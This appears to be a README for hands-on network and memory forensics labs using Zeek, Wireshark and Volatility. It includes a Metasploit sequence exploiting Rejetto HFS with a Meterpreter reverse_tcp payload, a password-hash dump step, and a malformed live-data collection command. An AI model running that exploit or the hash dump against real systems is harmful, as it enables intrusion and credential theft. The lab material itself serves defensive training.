# Network and Memory Forensics: Hands-On Labs

## Overview

This repository contains detailed labs and exercises for network and memory forensics using tools like Wireshark, Zeek, and Volatility. The labs cover practical aspects of incident response, including network traffic analysis, memory dump analysis, and malware investigation.

## Table of Contents

- [Network Forensics](#network-forensics)
  - [Zeek Log Analysis](#zeek-log-analysis)
  - [Wireshark Analysis](#wireshark-analysis)
  - [File Extraction](#file-extraction)
- [Memory Forensics](#memory-forensics)
  - [Memory Dump Extraction](#memory-dump-extraction)
  - [Analyzing Memory Dumps](#analyzing-memory-dumps)
  - [Extracting Artifacts and IoCs](#extracting-artifacts-and-iocs)
- [Incident Containment and Recovery](#incident-containment-and-recovery)
- [Live Ongoing Incident Response](#live-ongoing-incident-response)
- [Contributing](#contributing)
- [License](#license)

## Network Forensics

### Zeek Log Analysis

To analyze network traffic flows with Zeek, use the following command to extract TCP connections:

```bash
zeek-cut < conn.log id.orig_h id.orig_p id.resp_p duration proto history | grep tcp
```

### Wireshark Analysis

1. **Open the PCAP file**:
   ```bash
   wireshark project1.pcap
   ```

2. **Filter TCP Handshake**:
   Use the following filter in Wireshark to isolate traffic between the source and destination IP addresses:
   ```plaintext
   ip.addr == target-source && ip.addr == target-destination
   ```

3. **Follow TCP Stream**:
   Right-click on a packet and select **Follow > TCP Stream** to view the conversation between the two IP addresses.

### File Extraction

1. **Extract HTTP Objects**:
   Navigate to **File > Export Objects > HTTP** in Wireshark to extract transferred files. Save and list the files:

   ```bash
   ls
   ```

2. **Download and Analyze Files**:
   Extract and analyze suspicious files using a Java decompiler like JD-GUI. For example, if you extracted `Exploit.jar`:

   ```bash
   java -jar jd-gui.jar Exploit.jar
   ```

## Memory Forensics

### Memory Dump Extraction

1. **Extract Memory Dump**:
   Use a tool like `mrc` to extract the memory dump:

   ```bash
   mrc --acquire memory --output suspectmachine.raw
   ```

2. **Transfer Memory Dump**:
   Transfer the memory dump to your analysis machine:

   ```bash
   ftp ip.addr
   bin
   put suspectmachine.raw
   quit
   ```

### Analyzing Memory Dumps

1. **Identify OS Profile**:
   Use `volatility` to guess the OS profile:

   ```bash
   volatility -f suspectmachine.raw imageinfo
   ```

2. **Analyze Processes**:
   List running processes:

   ```bash
   volatility -f suspectmachine.raw --profile=Win7SP0x86 pslist
   ```

3. **Examine Process Tree**:
   View parent-child relationships between processes:

   ```bash
   volatility -f suspectmachine.raw --profile=Win7SP0x86 pstree
   ```

4. **Command History**:
   Retrieve executed commands:

   ```bash
   volatility -f suspectmachine.raw --profile=Win7SP0x86 cmdscan
   ```

5. **Network Connections**:
   Scan network connections:

   ```bash
   volatility -f suspectmachine.raw --profile=Win7SP0x86 netscan
   ```

### Extracting Artifacts and IoCs

1. **IE History**:
   View Internet Explorer history:

   ```bash
   volatility -f suspectmachine.raw --profile=Win7SP0x86 iehistory
   ```

2. **Hash Dump**:
   Dump password hashes:

   ```bash
   volatility -f suspectmachine.raw --profile=Win7SP0x86 hashdump
   ```

3. **Process Dump**:
   Dump specific processes:

   ```bash
   volatility -f suspectmachine.raw --profile=Win7SP0x86 procdump -D /tmp -p <PID>
   ```

## Incident Containment and Recovery

1. **Monitor Active Connections**:
   Use `tcpview` to observe active connections and processes. Compare with network captures.

2. **Validate Malicious Activity**:
   Use Metasploit to test vulnerabilities and confirm exploits. Example:

   ```bash
   msfconsole
   use exploit/windows/http/rejetto_hfs_exec
   set payload windows/meterpreter/reverse_tcp
   set lhost <ip.addr>
   set rhost <ip.addr>
   set rport 8081
   exploit
   ```

3. **Clean and Validate**:
   Ensure malicious files and processes are eradicated. Validate with:

   ```bash
   volatility -f suspectmachine.raw --profile=Win7SP0x86 pstree
   ```

## Live Ongoing Incident Response

1. **Collect Live Data**:
   Capture live data and system information:

   ```bash
   filename.txt && netstat -an >> filename.txt && arp -n >> filename.txt && sc query >> filename.txt && systeminfo >> filename.txt
   ```

2. **Analyze Collected Data**:
   Use `volatility` to analyze memory dumps:

   ```bash
   volatility -f filename.raw --profile=Win2003SP0x86 pslist
   ```

   Compare with captured data for discrepancies.

## Contributing

Contributions are welcome! Please fork this repository and submit a pull request with any improvements or additions.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.


